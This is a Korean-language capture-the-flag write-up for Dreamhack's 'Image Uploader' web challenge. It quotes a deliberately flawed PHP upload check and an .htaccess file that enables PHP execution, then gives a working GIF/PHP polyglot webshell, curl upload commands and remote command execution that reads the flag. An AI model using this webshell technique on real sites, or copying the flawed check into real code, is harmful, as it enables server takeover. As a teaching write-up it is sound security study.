---
ctf_name: "Dreamhack"
challenge_name: "Image Uploader"
category: "web"
difficulty: "medium"
author: "inhwan689"
date: "2026-07-28"
points: 500
tags: [file-upload, php, webshell, htaccess]
---

# Image Uploader

## 문제 설명

> 이미지를 업로드하고 갤러리에서 공유하는 PHP 서비스(ImageBox). 업로드된 파일은 uploads/ 디렉터리에 저장되고 gallery.php에서 목록으로 보여준다. JPG/JPEG/PNG/GIF만 허용된다고 안내한다.

- 제공 파일: Dockerfile, deploy/ (index.php, upload.php, gallery.php, templates/, uploads/.htaccess)

## 풀이

### 분석

핵심 코드는 `upload.php`의 확장자·MIME 검사다.

```php
$file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$check_extension = $file_extension;

$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $file['tmp_name']); 
finfo_close($finfo);

$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif', 'image/jpg'];

if (!in_array($mime_type, $allowed_mimes) && !in_array($check_extension, $allowed_extensions)) {
    die("<script>alert('Only images allowed.'); history.back();</script>");
}
```

저장 파일명은 원본 확장자를 그대로 유지한다. 그리고 uploads/.htaccess가 업로드 디렉터리에서 PHP 실행을 켜준다. Dockerfile이 AllowOverride All을 줬기 때문에 이 .htaccess가 실제로 적용된다.

```apache
AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .inc
<FilesMatch "\.php">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### 취약점

세 가지가 겹쳐서 임의 PHP 실행이 된다.

1. 조건이 !MIME허용 && !확장자허용이라, 둘 중 하나만 만족하면 된다. 올바르게 막으려면 `||`여야 했다.
2. finfo_file은 확장자가 아니라 매직바이트를 본다. 파일 맨 앞에 `GIF89a`만 넣으면 실제 내용이 PHP여도 image/gif로 판정된다.
3. 저장 파일이 .php이고 .htaccess가 이를 실행한다. 또한 .php는 이미지 확장자가 아니라서 gallery.php가 파일 아이콘 분기에서 전체 경로를 그대로 링크로 출력한다.

### 익스플로잇

1) GIF/PHP 폴리글랏 웹쉘 제작 — 앞에 GIF89a를 붙여 image/gif로 인식하게 한다.

```bash
printf 'GIF89a\n<?php system($_GET["c"]); ?>\n' > shell.php
file --mime-type shell.php
```

2) .php 이름 그대로 업로드

```bash
curl -s http://host3.dreamhack.games:18451/upload.php \
     -F "file=@shell.php;type=image/gif" -F "title=pwn" -F "description=x"
```

3) 갤러리에서 실제 파일명 획득

```bash
curl -s http://host3.dreamhack.games:18451/gallery.php \
   | grep -oE 'uploads/[0-9]{14}_[0-9]{4}_shell\.php' | tail -1
# -> uploads/20260728150211_6683_shell.php
```

4) RCE로 플래그 읽기

```bash
P="uploads/20260728150211_6683_shell.php"
curl -s "http://host3.dreamhack.games:18451/$P?c=id"
curl -s --get "http://host3.dreamhack.games:18451/$P" \
     --data-urlencode "c=cat /flag.txt"
```

## 플래그

```
DH{6cb5076e71927728a48baa3ed77dbc9d}
```

## 배운 점

- 부정 조건 + &&/||은 뒤집어서 읽어야 한다. `!A && !B`는 A도 B도 아니어야 거부 = 하나만 맞아도 통과이다. 화이트리스트 검사는 각 조건을 ||으로 묶어서 모드 만족시켜야 한다.
- MIME는 위조가 가능하다. 확장자-MIME 어느 쪽도 단독으로 신뢰하면 안 되고, 저장할 땐 서버가 정한 안전한 확장자로 파일명을 재작성해야 한다.
- 실패한 접근: 처음엔 `mt_rand(1000,9999)` 저장명을 어떻게 알아낼지 고민했지만, `.php`가 이미지가 아니라서 갤러리가 경로를 그대로 노출해줘 브루트포싱이 불필요했다.